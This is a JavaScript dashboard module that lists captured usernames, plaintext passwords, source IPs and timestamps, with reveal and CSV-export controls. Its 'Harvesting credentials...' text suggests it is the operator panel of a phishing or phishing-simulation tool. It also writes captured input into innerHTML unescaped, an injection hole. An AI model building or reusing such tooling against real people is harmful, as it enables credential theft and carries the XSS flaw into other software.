import { api } from '../api.js';

export const Credentials = {
    async render() {
        return `
            <div class="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
                <div class="p-6 border-b border-gray-100 flex justify-between items-center bg-gray-50">
                    <div class="flex gap-4">
                        <select id="strength-filter" class="px-3 py-2 border rounded-lg text-sm bg-white">
                            <option value="">All Strengths</option>
                            <option value="weak">Weak</option>
                            <option value="medium">Medium</option>
                            <option value="strong">Strong</option>
                        </select>
                    </div>
                    <button id="export-creds" class="px-4 py-2 bg-primary text-white rounded-lg text-sm font-bold">EXPORT DATA</button>
                </div>
                <div class="overflow-x-auto">
                    <table class="w-full text-left">
                        <thead class="text-xs text-gray-400 border-b border-gray-50 uppercase bg-white">
                            <tr>
                                <th class="py-4 px-6">Username</th>
                                <th class="py-4 px-6">Password</th>
                                <th class="py-4 px-6">Strength</th>
                                <th class="py-4 px-6">Source IP</th>
                                <th class="py-4 px-6">Timestamp</th>
                            </tr>
                        </thead>
                        <tbody id="creds-table-body">
                            <tr><td colspan="5" class="py-20 text-center text-gray-400">Harvesting credentials...</td></tr>
                        </tbody>
                    </table>
                </div>
            </div>
        `;
    },

    async init() {
        this.fetchData();
        document.getElementById('strength-filter').onchange = () => this.fetchData();
        document.getElementById('export-creds').onclick = () => this.exportData();
    },

    async fetchData() {
        try {
            const data = await api.get('credentials/');
            this.renderTable(data.credentials);
        } catch (e) {
            console.error(e);
        }
    },

    renderTable(creds) {
        const tbody = document.getElementById('creds-table-body');
        if (!creds.length) {
            tbody.innerHTML = '<tr><td colspan="5" class="py-20 text-center text-gray-400 font-mono">No credentials captured yet.</td></tr>';
            return;
        }

        tbody.innerHTML = creds.map(c => `
            <tr class="border-b border-gray-50 hover:bg-gray-50 transition-colors">
                <td class="py-4 px-6 font-bold text-primary">${c.username}</td>
                <td class="py-4 px-6 font-mono text-sm">
                    <div class="flex items-center gap-2">
                        <span class="password-mask" data-pw="${c.password}">••••••••</span>
                        <button class="reveal-btn text-gray-400 hover:text-gray-600">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" stroke-width="2"/><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" stroke-width="2"/></svg>
                        </button>
                    </div>
                </td>
                <td class="py-4 px-6">
                    <span class="px-2 py-1 rounded-full text-[10px] font-bold uppercase 
                        ${c.strength === 'strong' ? 'bg-green-50 text-green-600' : 
                          c.strength === 'medium' ? 'bg-orange-50 text-orange-600' : 
                          'bg-red-50 text-red-600'}">
                        ${c.strength}
                    </span>
                </td>
                <td class="py-4 px-6 font-mono text-xs text-gray-500">${c.ip_address}</td>
                <td class="py-4 px-6 text-sm text-gray-400">${new Date(c.timestamp).toLocaleString()}</td>
            </tr>
        `).join('');

        tbody.querySelectorAll('.reveal-btn').forEach(btn => {
            btn.onclick = (e) => {
                const span = e.currentTarget.previousElementSibling;
                const isMasked = span.innerText === '••••••••';
                span.innerText = isMasked ? span.getAttribute('data-pw') : '••••••••';
            };
        });
    },

    async exportData() {
        const data = await api.post('export/', { type: 'credentials', format: 'csv' });
        window.open(data.download_url, '_blank');
    }
};
